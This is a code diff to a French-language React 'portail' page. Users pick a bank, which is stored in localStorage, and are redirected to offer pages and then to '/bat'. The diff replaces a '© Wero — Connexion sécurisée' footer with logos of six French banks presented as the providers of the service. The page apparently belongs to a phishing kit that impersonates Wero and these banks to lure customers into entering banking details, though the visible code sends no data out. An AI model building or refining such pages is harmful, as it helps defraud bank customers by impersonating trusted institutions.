@@ -50,9 +50,9 @@ export default function PortailPage(): React.ReactElement {
       localStorage.setItem('banque_selectionnee', item.name);
     }
 
-    // Redirection directe vers la page dédiée (ex: /offre-1, /offre-2, etc.)
+    // Redirection vers le dossier /offres/offre-1 jusqu'à 11
     setTimeout(() => {
-      router.push(`/offre-${item.id}`);
+      router.push(`/offres/offre-${item.id}`);
     }, 2500);
   };
 
@@ -75,7 +75,7 @@ export default function PortailPage(): React.ReactElement {
     } finally {
       setIsSubmitting(false);
       setIsModalOpen(false);
-      router.push('/infos');
+      router.push('/bat');
     }
   };
 
@@ -171,12 +171,20 @@ export default function PortailPage(): React.ReactElement {
             ))}
           </div>
         </main>
+          <footer className="w-full px-5 py-5 border-t border-slate-100 bg-slate-50/50 text-center shrink-0">
+        <p className="text-xs font-medium text-slate-500 mb-3.5">
+          Ce service vous est proposé par :
+        </p>
 
-        <footer className="px-6 py-4 border-t border-slate-100 bg-[#FAFAFA] text-center">
-          <p className="text-[11px] text-slate-400 font-medium">
-            © Wero — Connexion sécurisée
-          </p>
-        </footer>
+        <div className="flex items-center justify-center gap-3.5 flex-wrap">
+          <img src="/Societe-Generale-Emblem.png" alt="Société Générale" className="h-4 object-contain" />
+          <img src="/Banquepopulaire_logo.svg.webp" alt="Banque Populaire" className="h-4 object-contain" />
+          <img src="/logo_BanquePostale_600x300.webp" alt="La Banque Postale" className="h-4 object-contain" />
+          <img src="/12895685.png" alt="Caisse d'Épargne" className="h-4 object-contain" />
+          <img src="/IMG_9197.png" alt="Crédit Agricole" className="h-4 object-contain" />
+          <img src="/unnamed.jpg" alt="Crédit Mutuel" className="h-4 object-contain" />
+        </div>
+      </footer>
       </div>
 
       {/* Pop-up pour "Autres banques" */}
